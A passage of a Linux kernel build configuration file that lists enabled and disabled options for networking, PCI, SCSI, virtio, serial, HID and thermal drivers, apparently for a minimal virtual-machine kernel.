# CONFIG_NET_L3_MASTER_DEV is not set
# CONFIG_QRTR is not set
# CONFIG_NET_NCSI is not set
# CONFIG_CGROUP_NET_PRIO is not set
# CONFIG_CGROUP_NET_CLASSID is not set
CONFIG_NET_RX_BUSY_POLL=y
CONFIG_BQL=y
# CONFIG_BPF_STREAM_PARSER is not set

#
# Network testing
#
# CONFIG_NET_PKTGEN is not set
# end of Network testing
# end of Networking options

# CONFIG_HAMRADIO is not set
# CONFIG_CAN is not set
# CONFIG_BT is not set
# CONFIG_AF_RXRPC is not set
# CONFIG_AF_KCM is not set
# CONFIG_MCTP is not set
# CONFIG_WIRELESS is not set
# CONFIG_RFKILL is not set
# CONFIG_NET_9P is not set
# CONFIG_CAIF is not set
# CONFIG_CEPH_LIB is not set
# CONFIG_NFC is not set
# CONFIG_PSAMPLE is not set
# CONFIG_NET_IFE is not set
# CONFIG_LWTUNNEL is not set
CONFIG_DST_CACHE=y
CONFIG_GRO_CELLS=y
CONFIG_NET_SOCK_MSG=y
CONFIG_PAGE_POOL=y
# CONFIG_PAGE_POOL_STATS is not set
CONFIG_FAILOVER=y
# CONFIG_ETHTOOL_NETLINK is not set

#
# Device Drivers
#
CONFIG_HAVE_EISA=y
# CONFIG_EISA is not set
CONFIG_HAVE_PCI=y
CONFIG_PCI=y
CONFIG_PCI_DOMAINS=y
# CONFIG_PCIEPORTBUS is not set
CONFIG_PCIEASPM=y
CONFIG_PCIEASPM_DEFAULT=y
# CONFIG_PCIEASPM_POWERSAVE is not set
# CONFIG_PCIEASPM_POWER_SUPERSAVE is not set
# CONFIG_PCIEASPM_PERFORMANCE is not set
# CONFIG_PCIE_PTM is not set
CONFIG_PCI_MSI=y
CONFIG_PCI_MSI_IRQ_DOMAIN=y
CONFIG_PCI_QUIRKS=y
# CONFIG_PCI_DEBUG is not set
# CONFIG_PCI_STUB is not set
CONFIG_PCI_LOCKLESS_CONFIG=y
# CONFIG_PCI_IOV is not set
# CONFIG_PCI_PRI is not set
# CONFIG_PCI_PASID is not set
CONFIG_PCI_LABEL=y
CONFIG_VGA_ARB=y
CONFIG_VGA_ARB_MAX_GPUS=16
CONFIG_HOTPLUG_PCI=y
CONFIG_HOTPLUG_PCI_ACPI=y
# CONFIG_HOTPLUG_PCI_ACPI_IBM is not set
# CONFIG_HOTPLUG_PCI_CPCI is not set
# CONFIG_HOTPLUG_PCI_SHPC is not set

#
# PCI controller drivers
#
# CONFIG_VMD is not set

#
# DesignWare PCI Core Support
#
# CONFIG_PCIE_DW_PLAT_HOST is not set
# CONFIG_PCI_MESON is not set
# end of DesignWare PCI Core Support

#
# Mobiveil PCIe Core Support
#
# end of Mobiveil PCIe Core Support

#
# Cadence PCIe controllers support
#
# end of Cadence PCIe controllers support
# end of PCI controller drivers

#
# PCI Endpoint
#
# CONFIG_PCI_ENDPOINT is not set
# end of PCI Endpoint

#
# PCI switch controller drivers
#
# CONFIG_PCI_SW_SWITCHTEC is not set
# end of PCI switch controller drivers

# CONFIG_CXL_BUS is not set
# CONFIG_PCCARD is not set
# CONFIG_RAPIDIO is not set

#
# Generic Driver Options
#
CONFIG_UEVENT_HELPER=y
CONFIG_UEVENT_HELPER_PATH=""""
CONFIG_DEVTMPFS=y
# CONFIG_DEVTMPFS_MOUNT is not set
# CONFIG_DEVTMPFS_SAFE is not set
CONFIG_STANDALONE=y
CONFIG_PREVENT_FIRMWARE_BUILD=y

#
# Firmware loader
#
CONFIG_FW_LOADER=y
CONFIG_EXTRA_FIRMWARE=""""
# CONFIG_FW_LOADER_USER_HELPER is not set
# CONFIG_FW_LOADER_COMPRESS is not set
# CONFIG_FW_UPLOAD is not set
# end of Firmware loader

CONFIG_ALLOW_DEV_COREDUMP=y
# CONFIG_DEBUG_DRIVER is not set
# CONFIG_DEBUG_DEVRES is not set
# CONFIG_DEBUG_TEST_DRIVER_REMOVE is not set
# CONFIG_TEST_ASYNC_DRIVER_PROBE is not set
CONFIG_GENERIC_CPU_AUTOPROBE=y
CONFIG_GENERIC_CPU_VULNERABILITIES=y
# end of Generic Driver Options

#
# Bus devices
#
# CONFIG_MHI_BUS is not set
# CONFIG_MHI_BUS_EP is not set
# end of Bus devices

# CONFIG_CONNECTOR is not set

#
# Firmware Drivers
#

#
# ARM System Control and Management Interface Protocol
#
# end of ARM System Control and Management Interface Protocol

# CONFIG_EDD is not set
CONFIG_FIRMWARE_MEMMAP=y
CONFIG_DMIID=y
# CONFIG_DMI_SYSFS is not set
CONFIG_DMI_SCAN_MACHINE_NON_EFI_FALLBACK=y
# CONFIG_ISCSI_IBFT is not set
# CONFIG_FW_CFG_SYSFS is not set
# CONFIG_SYSFB_SIMPLEFB is not set
# CONFIG_GOOGLE_FIRMWARE is not set

#
# EFI (Extensible Firmware Interface) Support
#
CONFIG_EFI_ESRT=y
# CONFIG_EFI_FAKE_MEMMAP is not set
CONFIG_EFI_DXE_MEM_ATTRIBUTES=y
CONFIG_EFI_RUNTIME_WRAPPERS=y
CONFIG_EFI_GENERIC_STUB_INITRD_CMDLINE_LOADER=y
# CONFIG_EFI_BOOTLOADER_CONTROL is not set
# CONFIG_EFI_CAPSULE_LOADER is not set
# CONFIG_EFI_TEST is not set
# CONFIG_APPLE_PROPERTIES is not set
# CONFIG_RESET_ATTACK_MITIGATION is not set
# CONFIG_EFI_RCI2_TABLE is not set
# CONFIG_EFI_DISABLE_PCI_DMA is not set
CONFIG_EFI_EARLYCON=y
# CONFIG_EFI_CUSTOM_SSDT_OVERLAYS is not set
# CONFIG_EFI_DISABLE_RUNTIME is not set
# CONFIG_EFI_COCO_SECRET is not set
# end of EFI (Extensible Firmware Interface) Support

#
# Tegra firmware driver
#
# end of Tegra firmware driver
# end of Firmware Drivers

# CONFIG_GNSS is not set
# CONFIG_MTD is not set
# CONFIG_OF is not set
CONFIG_ARCH_MIGHT_HAVE_PC_PARPORT=y
# CONFIG_PARPORT is not set
CONFIG_PNP=y
# CONFIG_PNP_DEBUG_MESSAGES is not set

#
# Protocols
#
CONFIG_PNPACPI=y
CONFIG_BLK_DEV=y
# CONFIG_BLK_DEV_NULL_BLK is not set
# CONFIG_BLK_DEV_FD is not set
# CONFIG_BLK_DEV_PCIESSD_MTIP32XX is not set
# CONFIG_ZRAM is not set
CONFIG_BLK_DEV_LOOP=m
CONFIG_BLK_DEV_LOOP_MIN_COUNT=8
# CONFIG_BLK_DEV_DRBD is not set
CONFIG_BLK_DEV_NBD=m
# CONFIG_BLK_DEV_RAM is not set
# CONFIG_CDROM_PKTCDVD is not set
# CONFIG_ATA_OVER_ETH is not set
CONFIG_VIRTIO_BLK=y
# CONFIG_BLK_DEV_RBD is not set
# CONFIG_BLK_DEV_UBLK is not set

#
# NVME Support
#
# CONFIG_BLK_DEV_NVME is not set
# CONFIG_NVME_FC is not set
# CONFIG_NVME_TCP is not set
# CONFIG_NVME_TARGET is not set
# end of NVME Support

#
# Misc devices
#
# CONFIG_DUMMY_IRQ is not set
# CONFIG_IBM_ASM is not set
# CONFIG_PHANTOM is not set
# CONFIG_TIFM_CORE is not set
# CONFIG_ENCLOSURE_SERVICES is not set
# CONFIG_HP_ILO is not set
# CONFIG_SRAM is not set
# CONFIG_DW_XDATA_PCIE is not set
# CONFIG_PCI_ENDPOINT_TEST is not set
# CONFIG_XILINX_SDFEC is not set
# CONFIG_C2PORT is not set

#
# EEPROM support
#
# CONFIG_EEPROM_93CX6 is not set
# end of EEPROM support

# CONFIG_CB710_CORE is not set

#
# Texas Instruments shared transport line discipline
#
# end of Texas Instruments shared transport line discipline

#
# Altera FPGA firmware download module (requires I2C)
#
# CONFIG_INTEL_MEI is not set
# CONFIG_INTEL_MEI_ME is not set
# CONFIG_INTEL_MEI_TXE is not set
# CONFIG_VMWARE_VMCI is not set
# CONFIG_GENWQE is not set
# CONFIG_ECHO is not set
# CONFIG_BCM_VK is not set
# CONFIG_MISC_ALCOR_PCI is not set
# CONFIG_MISC_RTSX_PCI is not set
# CONFIG_HABANA_AI is not set
# CONFIG_PVPANIC is not set
# end of Misc devices

#
# SCSI device support
#
CONFIG_SCSI_MOD=y
# CONFIG_RAID_ATTRS is not set
CONFIG_SCSI_COMMON=y
CONFIG_SCSI=y
CONFIG_SCSI_DMA=y
CONFIG_SCSI_PROC_FS=y

#
# SCSI support type (disk, tape, CD-ROM)
#
CONFIG_BLK_DEV_SD=y
# CONFIG_CHR_DEV_ST is not set
# CONFIG_BLK_DEV_SR is not set
# CONFIG_CHR_DEV_SG is not set
CONFIG_BLK_DEV_BSG=y
# CONFIG_CHR_DEV_SCH is not set
# CONFIG_SCSI_CONSTANTS is not set
# CONFIG_SCSI_LOGGING is not set
CONFIG_SCSI_SCAN_ASYNC=y

#
# SCSI Transports
#
# CONFIG_SCSI_SPI_ATTRS is not set
# CONFIG_SCSI_FC_ATTRS is not set
# CONFIG_SCSI_ISCSI_ATTRS is not set
# CONFIG_SCSI_SAS_ATTRS is not set
# CONFIG_SCSI_SAS_LIBSAS is not set
# CONFIG_SCSI_SRP_ATTRS is not set
# end of SCSI Transports

CONFIG_SCSI_LOWLEVEL=y
# CONFIG_ISCSI_TCP is not set
# CONFIG_ISCSI_BOOT_SYSFS is not set
# CONFIG_SCSI_CXGB3_ISCSI is not set
# CONFIG_SCSI_BNX2_ISCSI is not set
# CONFIG_BE2ISCSI is not set
# CONFIG_BLK_DEV_3W_XXXX_RAID is not set
# CONFIG_SCSI_HPSA is not set
# CONFIG_SCSI_3W_9XXX is not set
# CONFIG_SCSI_3W_SAS is not set
# CONFIG_SCSI_ACARD is not set
# CONFIG_SCSI_AACRAID is not set
# CONFIG_SCSI_AIC7XXX is not set
# CONFIG_SCSI_AIC79XX is not set
# CONFIG_SCSI_AIC94XX is not set
# CONFIG_SCSI_MVSAS is not set
# CONFIG_SCSI_MVUMI is not set
# CONFIG_SCSI_ADVANSYS is not set
# CONFIG_SCSI_ARCMSR is not set
# CONFIG_SCSI_ESAS2R is not set
# CONFIG_MEGARAID_NEWGEN is not set
# CONFIG_MEGARAID_LEGACY is not set
# CONFIG_MEGARAID_SAS is not set
# CONFIG_SCSI_MPT3SAS is not set
# CONFIG_SCSI_MPT2SAS is not set
# CONFIG_SCSI_MPI3MR is not set
# CONFIG_SCSI_SMARTPQI is not set
# CONFIG_SCSI_HPTIOP is not set
# CONFIG_SCSI_BUSLOGIC is not set
# CONFIG_SCSI_MYRB is not set
# CONFIG_SCSI_MYRS is not set
# CONFIG_VMWARE_PVSCSI is not set
# CONFIG_SCSI_SNIC is not set
# CONFIG_SCSI_DMX3191D is not set
# CONFIG_SCSI_FDOMAIN_PCI is not set
# CONFIG_SCSI_ISCI is not set
# CONFIG_SCSI_IPS is not set
# CONFIG_SCSI_INITIO is not set
# CONFIG_SCSI_INIA100 is not set
# CONFIG_SCSI_STEX is not set
# CONFIG_SCSI_SYM53C8XX_2 is not set
# CONFIG_SCSI_QLOGIC_1280 is not set
# CONFIG_SCSI_QLA_ISCSI is not set
# CONFIG_SCSI_DC395x is not set
# CONFIG_SCSI_AM53C974 is not set
# CONFIG_SCSI_WD719X is not set
# CONFIG_SCSI_DEBUG is not set
# CONFIG_SCSI_PMCRAID is not set
# CONFIG_SCSI_PM8001 is not set
# CONFIG_SCSI_VIRTIO is not set
# CONFIG_SCSI_DH is not set
# end of SCSI device support

# CONFIG_ATA is not set
CONFIG_MD=y
# CONFIG_BLK_DEV_MD is not set
# CONFIG_BCACHE is not set
CONFIG_BLK_DEV_DM_BUILTIN=y
CONFIG_BLK_DEV_DM=m
# CONFIG_DM_DEBUG is not set
# CONFIG_DM_UNSTRIPED is not set
CONFIG_DM_CRYPT=m
# CONFIG_DM_SNAPSHOT is not set
# CONFIG_DM_THIN_PROVISIONING is not set
# CONFIG_DM_CACHE is not set
# CONFIG_DM_WRITECACHE is not set
# CONFIG_DM_EBS is not set
# CONFIG_DM_ERA is not set
# CONFIG_DM_CLONE is not set
# CONFIG_DM_MIRROR is not set
# CONFIG_DM_RAID is not set
# CONFIG_DM_ZERO is not set
# CONFIG_DM_MULTIPATH is not set
# CONFIG_DM_DELAY is not set
# CONFIG_DM_DUST is not set
# CONFIG_DM_UEVENT is not set
# CONFIG_DM_FLAKEY is not set
# CONFIG_DM_VERITY is not set
# CONFIG_DM_SWITCH is not set
# CONFIG_DM_LOG_WRITES is not set
# CONFIG_DM_INTEGRITY is not set
# CONFIG_DM_AUDIT is not set
# CONFIG_TARGET_CORE is not set
# CONFIG_FUSION is not set

#
# IEEE 1394 (FireWire) support
#
# CONFIG_FIREWIRE is not set
# CONFIG_FIREWIRE_NOSY is not set
# end of IEEE 1394 (FireWire) support

# CONFIG_MACINTOSH_DRIVERS is not set
CONFIG_NETDEVICES=y
CONFIG_NET_CORE=y
# CONFIG_BONDING is not set
# CONFIG_DUMMY is not set
# CONFIG_WIREGUARD is not set
# CONFIG_EQUALIZER is not set
# CONFIG_NET_FC is not set
# CONFIG_NET_TEAM is not set
# CONFIG_MACVLAN is not set
# CONFIG_IPVLAN is not set
# CONFIG_VXLAN is not set
# CONFIG_GENEVE is not set
# CONFIG_BAREUDP is not set
# CONFIG_GTP is not set
# CONFIG_MACSEC is not set
# CONFIG_NETCONSOLE is not set
# CONFIG_TUN is not set
# CONFIG_TUN_VNET_CROSS_LE is not set
# CONFIG_VETH is not set
CONFIG_VIRTIO_NET=y
# CONFIG_NLMON is not set
# CONFIG_ARCNET is not set
# CONFIG_ETHERNET is not set
# CONFIG_FDDI is not set
# CONFIG_HIPPI is not set
# CONFIG_NET_SB1000 is not set
# CONFIG_PHYLIB is not set
# CONFIG_PSE_CONTROLLER is not set
# CONFIG_MDIO_DEVICE is not set

#
# PCS device drivers
#
# end of PCS device drivers

# CONFIG_PPP is not set
# CONFIG_SLIP is not set

#
# Host-side USB support is needed for USB Network Adapter support
#
# CONFIG_WLAN is not set
# CONFIG_WAN is not set

#
# Wireless WAN
#
# CONFIG_WWAN is not set
# end of Wireless WAN

# CONFIG_VMXNET3 is not set
# CONFIG_FUJITSU_ES is not set
CONFIG_NET_FAILOVER=y
# CONFIG_ISDN is not set

#
# Input device support
#
CONFIG_INPUT=y
CONFIG_INPUT_FF_MEMLESS=y
# CONFIG_INPUT_SPARSEKMAP is not set
# CONFIG_INPUT_MATRIXKMAP is not set
CONFIG_INPUT_VIVALDIFMAP=y

#
# Userland interfaces
#
# CONFIG_INPUT_MOUSEDEV is not set
# CONFIG_INPUT_JOYDEV is not set
CONFIG_INPUT_EVDEV=m
# CONFIG_INPUT_EVBUG is not set

#
# Input Device Drivers
#
CONFIG_INPUT_KEYBOARD=y
CONFIG_KEYBOARD_ATKBD=y
# CONFIG_KEYBOARD_LKKBD is not set
# CONFIG_KEYBOARD_NEWTON is not set
# CONFIG_KEYBOARD_OPENCORES is not set
# CONFIG_KEYBOARD_SAMSUNG is not set
# CONFIG_KEYBOARD_STOWAWAY is not set
# CONFIG_KEYBOARD_SUNKBD is not set
# CONFIG_KEYBOARD_XTKBD is not set
# CONFIG_INPUT_MOUSE is not set
# CONFIG_INPUT_JOYSTICK is not set
# CONFIG_INPUT_TABLET is not set
# CONFIG_INPUT_TOUCHSCREEN is not set
# CONFIG_INPUT_MISC is not set
# CONFIG_RMI4_CORE is not set

#
# Hardware I/O ports
#
CONFIG_SERIO=y
CONFIG_ARCH_MIGHT_HAVE_PC_SERIO=y
CONFIG_SERIO_I8042=y
CONFIG_SERIO_SERPORT=y
# CONFIG_SERIO_CT82C710 is not set
# CONFIG_SERIO_PCIPS2 is not set
CONFIG_SERIO_LIBPS2=y
# CONFIG_SERIO_RAW is not set
# CONFIG_SERIO_ALTERA_PS2 is not set
# CONFIG_SERIO_PS2MULT is not set
# CONFIG_SERIO_ARC_PS2 is not set
# CONFIG_USERIO is not set
# CONFIG_GAMEPORT is not set
# end of Hardware I/O ports
# end of Input device support

#
# Character devices
#
CONFIG_TTY=y
CONFIG_VT=y
CONFIG_CONSOLE_TRANSLATIONS=y
CONFIG_VT_CONSOLE=y
CONFIG_HW_CONSOLE=y
# CONFIG_VT_HW_CONSOLE_BINDING is not set
CONFIG_UNIX98_PTYS=y
# CONFIG_LEGACY_PTYS is not set
CONFIG_LDISC_AUTOLOAD=y

#
# Serial drivers
#
CONFIG_SERIAL_EARLYCON=y
CONFIG_SERIAL_8250=y
# CONFIG_SERIAL_8250_DEPRECATED_OPTIONS is not set
CONFIG_SERIAL_8250_PNP=y
# CONFIG_SERIAL_8250_16550A_VARIANTS is not set
# CONFIG_SERIAL_8250_FINTEK is not set
CONFIG_SERIAL_8250_CONSOLE=y
CONFIG_SERIAL_8250_PCI=y
# CONFIG_SERIAL_8250_EXAR is not set
CONFIG_SERIAL_8250_NR_UARTS=4
CONFIG_SERIAL_8250_RUNTIME_UARTS=4
# CONFIG_SERIAL_8250_EXTENDED is not set
CONFIG_SERIAL_8250_DWLIB=y
# CONFIG_SERIAL_8250_DW is not set
# CONFIG_SERIAL_8250_RT288X is not set
CONFIG_SERIAL_8250_LPSS=y
CONFIG_SERIAL_8250_MID=y
CONFIG_SERIAL_8250_PERICOM=y

#
# Non-8250 serial port support
#
# CONFIG_SERIAL_UARTLITE is not set
CONFIG_SERIAL_CORE=y
CONFIG_SERIAL_CORE_CONSOLE=y
# CONFIG_SERIAL_JSM is not set
# CONFIG_SERIAL_LANTIQ is not set
# CONFIG_SERIAL_SCCNXP is not set
# CONFIG_SERIAL_ALTERA_JTAGUART is not set
# CONFIG_SERIAL_ALTERA_UART is not set
# CONFIG_SERIAL_ARC is not set
# CONFIG_SERIAL_RP2 is not set
# CONFIG_SERIAL_FSL_LPUART is not set
# CONFIG_SERIAL_FSL_LINFLEXUART is not set
# CONFIG_SERIAL_SPRD is not set
# end of Serial drivers

# CONFIG_SERIAL_NONSTANDARD is not set
# CONFIG_N_GSM is not set
# CONFIG_NOZOMI is not set
# CONFIG_NULL_TTY is not set
CONFIG_HVC_DRIVER=y
# CONFIG_SERIAL_DEV_BUS is not set
CONFIG_VIRTIO_CONSOLE=y
# CONFIG_IPMI_HANDLER is not set
CONFIG_HW_RANDOM=m
# CONFIG_HW_RANDOM_TIMERIOMEM is not set
CONFIG_HW_RANDOM_INTEL=m
# CONFIG_HW_RANDOM_AMD is not set
# CONFIG_HW_RANDOM_BA431 is not set
# CONFIG_HW_RANDOM_VIA is not set
CONFIG_HW_RANDOM_VIRTIO=m
# CONFIG_HW_RANDOM_XIPHERA is not set
# CONFIG_APPLICOM is not set
# CONFIG_MWAVE is not set
CONFIG_DEVMEM=y
# CONFIG_NVRAM is not set
CONFIG_DEVPORT=y
# CONFIG_HPET is not set
# CONFIG_HANGCHECK_TIMER is not set
# CONFIG_TCG_TPM is not set
# CONFIG_TELCLOCK is not set
# CONFIG_XILLYBUS is not set
# CONFIG_RANDOM_TRUST_CPU is not set
# CONFIG_RANDOM_TRUST_BOOTLOADER is not set
# end of Character devices

#
# I2C support
#
# CONFIG_I2C is not set
# end of I2C support

# CONFIG_I3C is not set
# CONFIG_SPI is not set
# CONFIG_SPMI is not set
# CONFIG_HSI is not set
# CONFIG_PPS is not set

#
# PTP clock support
#
# CONFIG_PTP_1588_CLOCK is not set
CONFIG_PTP_1588_CLOCK_OPTIONAL=y

#
# Enable PHYLIB and NETWORK_PHY_TIMESTAMPING to see the additional clocks.
#
# end of PTP clock support

# CONFIG_PINCTRL is not set
# CONFIG_GPIOLIB is not set
# CONFIG_W1 is not set
# CONFIG_POWER_RESET is not set
# CONFIG_POWER_SUPPLY is not set
# CONFIG_HWMON is not set
CONFIG_THERMAL=y
# CONFIG_THERMAL_NETLINK is not set
# CONFIG_THERMAL_STATISTICS is not set
CONFIG_THERMAL_EMERGENCY_POWEROFF_DELAY_MS=0
CONFIG_THERMAL_WRITABLE_TRIPS=y
CONFIG_THERMAL_DEFAULT_GOV_STEP_WISE=y
# CONFIG_THERMAL_DEFAULT_GOV_FAIR_SHARE is not set
# CONFIG_THERMAL_DEFAULT_GOV_USER_SPACE is not set
# CONFIG_THERMAL_GOV_FAIR_SHARE is not set
CONFIG_THERMAL_GOV_STEP_WISE=y
# CONFIG_THERMAL_GOV_BANG_BANG is not set
CONFIG_THERMAL_GOV_USER_SPACE=y
# CONFIG_THERMAL_EMULATION is not set

#
# Intel thermal drivers
#
# CONFIG_INTEL_POWERCLAMP is not set
CONFIG_X86_THERMAL_VECTOR=y
CONFIG_X86_PKG_TEMP_THERMAL=m
# CONFIG_INTEL_SOC_DTS_THERMAL is not set

#
# ACPI INT340X thermal drivers
#
# CONFIG_INT340X_THERMAL is not set
# end of ACPI INT340X thermal drivers

# CONFIG_INTEL_PCH_THERMAL is not set
# CONFIG_INTEL_TCC_COOLING is not set
# CONFIG_INTEL_HFI_THERMAL is not set
# end of Intel thermal drivers

# CONFIG_WATCHDOG is not set
CONFIG_SSB_POSSIBLE=y
# CONFIG_SSB is not set
CONFIG_BCMA_POSSIBLE=y
# CONFIG_BCMA is not set

#
# Multifunction device drivers
#
# CONFIG_MFD_MADERA is not set
# CONFIG_HTC_PASIC3 is not set
# CONFIG_MFD_INTEL_QUARK_I2C_GPIO is not set
# CONFIG_LPC_ICH is not set
# CONFIG_LPC_SCH is not set
# CONFIG_MFD_INTEL_LPSS_ACPI is not set
# CONFIG_MFD_INTEL_LPSS_PCI is not set
# CONFIG_MFD_JANZ_CMODIO is not set
# CONFIG_MFD_KEMPLD is not set
# CONFIG_MFD_MT6397 is not set
# CONFIG_MFD_RDC321X is not set
# CONFIG_MFD_SM501 is not set
# CONFIG_MFD_SYSCON is not set
# CONFIG_MFD_TI_AM335X_TSCADC is not set
# CONFIG_MFD_TQMX86 is not set
# CONFIG_MFD_VX855 is not set
# end of Multifunction device drivers

# CONFIG_REGULATOR is not set
# CONFIG_RC_CORE is not set

#
# CEC support
#
# CONFIG_MEDIA_CEC_SUPPORT is not set
# end of CEC support

# CONFIG_MEDIA_SUPPORT is not set

#
# Graphics support
#
# CONFIG_AGP is not set
# CONFIG_VGA_SWITCHEROO is not set
# CONFIG_DRM is not set

#
# ARM devices
#
# end of ARM devices

#
# Frame buffer Devices
#
# CONFIG_FB is not set
# end of Frame buffer Devices

#
# Backlight & LCD device support
#
# CONFIG_LCD_CLASS_DEVICE is not set
# CONFIG_BACKLIGHT_CLASS_DEVICE is not set
# end of Backlight & LCD device support

#
# Console display driver support
#
CONFIG_VGA_CONSOLE=y
CONFIG_DUMMY_CONSOLE=y
CONFIG_DUMMY_CONSOLE_COLUMNS=80
CONFIG_DUMMY_CONSOLE_ROWS=25
# end of Console display driver support
# end of Graphics support

# CONFIG_SOUND is not set

#
# HID support
#
CONFIG_HID=y
# CONFIG_HID_BATTERY_STRENGTH is not set
# CONFIG_HIDRAW is not set
# CONFIG_UHID is not set
CONFIG_HID_GENERIC=y

#
# Special HID drivers
#
CONFIG_HID_A4TECH=y
# CONFIG_HID_ACRUX is not set
# CONFIG_HID_AUREAL is not set
CONFIG_HID_BELKIN=y
CONFIG_HID_CHERRY=y
# CONFIG_HID_COUGAR is not set
# CONFIG_HID_MACALLY is not set
# CONFIG_HID_CMEDIA is not set
CONFIG_HID_CYPRESS=y
# CONFIG_HID_DRAGONRISE is not set
# CONFIG_HID_EMS_FF is not set
# CONFIG_HID_ELECOM is not set
CONFIG_HID_EZKEY=y
# CONFIG_HID_GEMBIRD is not set
# CONFIG_HID_GFRM is not set
# CONFIG_HID_GLORIOUS is not set
# CONFIG_HID_VIVALDI is not set
# CONFIG_HID_KEYTOUCH is not set
# CONFIG_HID_KYE is not set
# CONFIG_HID_WALTOP is not set
# CONFIG_HID_VIEWSONIC is not set
# CONFIG_HID_VRC2 is not set
# CONFIG_HID_XIAOMI is not set
# CONFIG_HID_GYRATION is not set
# CONFIG_HID_ICADE is not set
# CONFIG_HID_ITE is not set
# CONFIG_HID_JABRA is not set
# CONFIG_HID_TWINHAN is not set
CONFIG_HID_KENSINGTON=y
# CONFIG_HID_LCPOWER is not set
# CONFIG_HID_LENOVO is not set
# CONFIG_HID_MAGICMOUSE is not set
# CONFIG_HID_MALTRON is not set
# CONFIG_HID_MAYFLASH is not set
# CONFIG_HID_REDRAGON is not set
CONFIG_HID_MICROSOFT=y
CONFIG_HID_MONTEREY=y
# CONFIG_HID_MULTITOUCH is not set
# CONFIG_HID_NTI is not set
# CONFIG_HID_ORTEK is not set
# CONFIG_HID_PANTHERLORD is not set
# CONFIG_HID_PETALYNX is not set
# CONFIG_HID_PICOLCD is not set
# CONFIG_HID_PLANTRONICS is not set
# CONFIG_HID_PXRC is not set
# CONFIG_HID_RAZER is not set
# CONFIG_HID_PRIMAX is not set
# CONFIG_HID_SAITEK is not set
# CONFIG_HID_SEMITEK is not set
# CONFIG_HID_SPEEDLINK is not set
# CONFIG_HID_STEAM is not set
# CONFIG_HID_STEELSERIES is not set
# CONFIG_HID_SUNPLUS is not set
# CONFIG_HID_RMI is not set
# CONFIG_HID_GREENASIA is not set
# CONFIG_HID_SMARTJOYPLUS is not set
# CONFIG_HID_TIVO is not set
# CONFIG_HID_TOPSEED is not set
# CONFIG_HID_TOPRE is not set
# CONFIG_HID_UDRAW_PS3 is not set
# CONFIG_HID_XINMO is not set
# CONFIG_HID_ZEROPLUS is not set
# CONFIG_HID_ZYDACRON is not set
# CONFIG_HID_SENSOR_HUB is not set
# CONFIG_HID_ALPS is not set
# end of Special HID drivers

#
# Intel ISH HID support
#
# CONFIG_INTEL_ISH_HID is not set
# end of Intel ISH HID support

#
# AMD SFH HID Support
#
# CONFIG_AMD_SFH_HID is not set
# end of AMD SFH HID Support
# end of HID support

CONFIG_USB_OHCI_LITTLE_ENDIAN=y
# CONFIG_USB_SUPPORT is not set
# CONFIG_MMC is not set
# CONFIG_SCSI_UFSHCD is not set
# CONFIG_MEMSTICK is not set
# CONFIG_NEW_LEDS is not set
# CONFIG_ACCESSIBILITY is not set
# CONFIG_INFINIBAND is not set
CONFIG_EDAC_ATOMIC_SCRUB=y
CONFIG_EDAC_SUPPORT=y
CONFIG_RTC_LIB=y
CONFIG_RTC_MC146818_LIB=y
# CONFIG_RTC_CLASS is not set
# CONFIG_DMADEVICES is not set

#
# DMABUF options
#
# CONFIG_SYNC_FILE is not set
# CONFIG_DMABUF_HEAPS is not set
# end of DMABUF options

# CONFIG_AUXDISPLAY is not set
# CONFIG_UIO is not set
# CONFIG_VFIO is not set
CONFIG_VIRT_DRIVERS=y
CONFIG_VMGENID=y
# CONFIG_VBOXGUEST is not set
# CONFIG_EFI_SECRET is not set
CONFIG_VIRTIO_ANCHOR=y
CONFIG_VIRTIO=y
CONFIG_VIRTIO_PCI_LIB=y
CONFIG_VIRTIO_PCI_LIB_LEGACY=y
CONFIG_VIRTIO_MENU=y
CONFIG_VIRTIO_PCI=y
CONFIG_VIRTIO_PCI_LEGACY=y
CONFIG_VIRTIO_BALLOON=m
CONFIG_VIRTIO_INPUT=m
CONFIG_VIRTIO_MMIO=m
# CONFIG_VIRTIO_MMIO_CMDLINE_DEVICES is not set
# CONFIG_VDPA is not set
# CONFIG_VHOST_MENU is not set

#
# Microsoft Hyper-V guest support
#
# CONFIG_HYPERV is not set
# end of Microsoft Hyper-V guest support

# CONFIG_GREYBUS is not set
# CONFIG_COMEDI is not set
# CONFIG_STAGING is not set
# CONFIG_CHROME_PLATFORMS is not set
# CONFIG_MELLANOX_PLATFORM is not set
CONFIG_SURFACE_PLATFORMS=y
# CONFIG_SURFACE_GPE is not set
# CONFIG_SURFACE_PRO3_BUTTON is not set
# CONFIG_X86_PLATFORM_DEVICES is not set
# CONFIG_P2SB is not set
CONFIG_HAVE_CLK=y
CONFIG_HAVE_CLK_PREPARE=y
CONFIG_COMMON_CLK=y
# CONFIG_XILINX_VCU is not set
# CONFIG_HWSPINLOCK is not set

#
# Clock Source drivers
#
CONFIG_CLKEVT_I8253=y
CONFIG_I8253_LOCK=y
CONFIG_CLKBLD_I8253=y
# end of Clock Source drivers

# CONFIG_MAILBOX is not set
# CONFIG_IOMMU_SUPPORT is not set

#
# Remoteproc drivers
#
# CONFIG_REMOTEPROC is not set
# end of Remoteproc drivers

#
# Rpmsg drivers
#
# CONFIG_RPMSG_VIRTIO is not set
# end of Rpmsg drivers

# CONFIG_SOUNDWIRE is not set

#
# SOC (System On Chip) specific Drivers
#

#
# Amlogic SoC drivers
#
# end of Amlogic SoC drivers

#
# Broadcom SoC drivers
#
# end of Broadcom SoC drivers

#
# NXP/Freescale QorIQ SoC drivers
#
# end of NXP/Freescale QorIQ SoC drivers

#
# fujitsu SoC drivers
#
# end of fujitsu SoC drivers

#
# i.MX SoC drivers
#
# end of i.MX SoC drivers

#
# Enable LiteX SoC Builder specific drivers
#
# end of Enable LiteX SoC Builder specific drivers

#
# Qualcomm SoC drivers
#
# end of Qualcomm SoC drivers

# CONFIG_SOC_TI is not set

#
# Xilinx SoC drivers
#
# end of Xilinx SoC drivers
# end of SOC (System On Chip) specific Drivers

# CONFIG_PM_DEVFREQ is not set
# CONFIG_EXTCON is not set
# CONFIG_MEMORY is not set
# CONFIG_IIO is not set
# CONFIG_NTB is not set
# CONFIG_PWM is not set

#
# IRQ chip support
#
# end of IRQ chip support

# CONFIG_IPACK_BUS is not set
# CONFIG_RESET_CONTROLLER is not set

#
# PHY Subsystem
#
# CONFIG_GENERIC_PHY is not set
# CONFIG_PHY_CAN_TRANSCEIVER is not set

#
# PHY drivers for Broadcom platforms
#
# CONFIG_BCM_KONA_USB2_PHY is not set
# end of PHY drivers for Broadcom platforms

# CONFIG_PHY_PXA_28NM_HSIC is not set
# CONFIG_PHY_PXA_28NM_USB2 is not set
# CONFIG_PHY_INTEL_LGM_EMMC is not set
# end of PHY Subsystem

# CONFIG_POWERCAP is not set
